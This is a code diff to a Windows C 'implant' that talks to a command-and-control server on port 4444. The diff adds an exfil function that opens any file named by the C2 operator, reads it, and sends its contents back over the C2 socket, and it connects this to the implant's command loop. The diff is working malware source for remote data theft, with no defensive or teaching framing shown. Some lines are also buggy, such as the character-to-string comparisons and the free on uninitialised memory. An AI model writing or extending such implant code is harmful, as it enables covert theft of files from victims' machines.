@@ -14,6 +14,7 @@
 #define SERVER_PORT 4444
 
 SOCKET c2_sock;
+HANDLE heap;
 
 // Present working directory, globally accessible
 char pwd[MAX_PATH + 1] = {0};
@@ -32,6 +33,7 @@ BOOL change_dir(char *path, int len) {
     // No support for relative paths
     return FALSE;
 }
+
 
 // Write file + directory listing to out
 DWORD ls(char *path, char* out) {
@@ -67,12 +69,68 @@ DWORD ls(char *path, char* out) {
 
         status = FindNextFileA(h, &data);
     } while (status != 0);
+    
     FindClose(h);
-
     if (status == 0 || status == ERROR_NO_MORE_FILES)
         return 0;
     return -1;
 }
+
+
+// Reads data from file given by path and sends it back to C2 server
+DWORD exfil(char* path) {
+    char abs_path[MAX_PATH] = {0};
+    DWORD numBytesRead = 0;
+    LARGE_INTEGER fileSize;
+    int status = 0;
+
+    // Convert relative path to absolute path
+    if (path[0] != "C" || path[1] != ":") {
+        sprintf(abs_path, "%s\\%s", pwd, path);
+    }
+    // Otherwise just use path as-is
+    else {
+        strcpy(abs_path, path);
+    }
+
+    // Open file
+    HANDLE hFile = CreateFile(abs_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        c2_send(c2_sock, "ERROR opening file", 18);
+        status = -1;
+        goto end;
+    }
+
+    // Get file size
+    int low = 0;
+    low = GetFileSize(hFile, &fileSize.HighPart);
+    fileSize.LowPart = low;
+
+    // Allocate buffer on heap for the data
+    char* out = (char*) HeapAlloc(heap, HEAP_ZERO_MEMORY, fileSize.QuadPart);
+    if (out == NULL) {
+        c2_send(c2_sock, "ERROR Not enough memory", 23);
+        status = -1;
+        goto end;
+    }
+
+    // Read data
+    BOOL res = ReadFile(hFile, out, fileSize.QuadPart, &numBytesRead, NULL);
+    if (!res) {
+        c2_send(c2_sock, "ERROR reading file", 18);
+        status = -1;
+        goto end;
+    }
+    c2_send(c2_sock, out, numBytesRead);
+
+end:
+    HeapFree(heap, 0, out);
+    CloseHandle(hFile);
+    return status;
+}
+
+
+
 
 // cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
 // cl implant.c c2_net.c /Fe:implant.exe
@@ -102,6 +160,8 @@ int main() {
     GetCurrentDirectory(_MAX_PATH, pwd);
     c2_send(c2_sock, pwd, strlen(pwd));
 
+    // Get heap handle
+    heap = GetProcessHeap();
     
     while (TRUE) {
         // Get data
@@ -137,7 +197,9 @@ int main() {
             c2_send(c2_sock, pwd, strlen(pwd));
         }
         else if(strncmp(buffer, "exfil ", 5) == 0) {
-            
+            if (len >= 7) {
+                exfil(buffer + 6);
+            }   
         }
         else if(strncmp(buffer, "upload ", 6) == 0) {
             
